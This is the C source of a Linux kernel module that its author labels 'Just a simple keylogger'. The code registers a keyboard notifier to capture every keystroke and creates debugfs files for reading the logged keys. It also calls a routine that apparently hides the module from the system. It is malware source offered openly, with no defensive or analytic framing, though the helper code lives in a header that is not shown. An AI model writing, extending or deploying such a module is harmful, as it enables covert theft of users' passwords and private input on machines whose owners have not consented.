#include "keylogger.h"
MODULE_LICENSE("GPL");
MODULE_AUTHOR("8xbit");
MODULE_VERSION("1.0");
MODULE_DESCRIPTION("Just a simple keylogger");
MODULE_SUPPORTED_DEVICE("Not machine dependent");
static struct dentry *file;
static struct dentry *file1;

static struct dentry *subdir;
int ret = 0;

static struct notifier_block keylogger ={.notifier_call = notifier};


static int __init MOD_LOAD(void)
{
    ret = driver_entry();
    if (ret == -1)
    {
        printk(KERN_ALERT "Keylogger: unbale to load the module -> driver entry");
        return ret;
    }
    else
    {
        printk(KERN_ALERT "Keylogger: load the device driver successfully");
    }
    ret = hide_driver_entery();
    if (ret == -1)
    {
        printk(KERN_ALERT "Keylogger: unbale to load the module -> driver entry");
        return ret;
    }
    else
    {
        printk(KERN_ALERT "Keylogger: load the device driver successfully");
    }
    subdir = debugfs_create_dir("keylogger", NULL);


    if(IS_ERR(subdir))
        return PTR_ERR(subdir);
    else if (!subdir)
        return -ENOENT;
    else
    {
        printk(KERN_ALERT "Keylogger: create debugfs dir");
    }
    
    file = debugfs_create_file("keyloging",0500, subdir, NULL, &fops);
    if (!file)
    {
        debugfs_remove_recursive(subdir);
        return -ENOENT;
    }
    file1 = debugfs_create_file("hide",0500, subdir, NULL, &fops_hide);
    if (!file1)
    {
        debugfs_remove_recursive(subdir);
        return -ENOENT;
    }
    
    else
    {
        printk(KERN_ALERT "Keylogger: create debugfs file");

    }
    
    ret= register_keyboard_notifier(&keylogger);
    if (ret == -1)
    {
        printk(KERN_ALERT "Keylogger: unable to load the module -> keyboard notifier");
        return ret;
    }

    return ret;

}
static void __exit MOD_UNLOAD(void)
{
   unregister_keyboard_notifier(&keylogger);
    driver_exit();
    debugfs_remove_recursive(subdir);
    printk(KERN_ALERT "Keylogger: unload the module");
} 






module_init(MOD_LOAD);
module_exit(MOD_UNLOAD);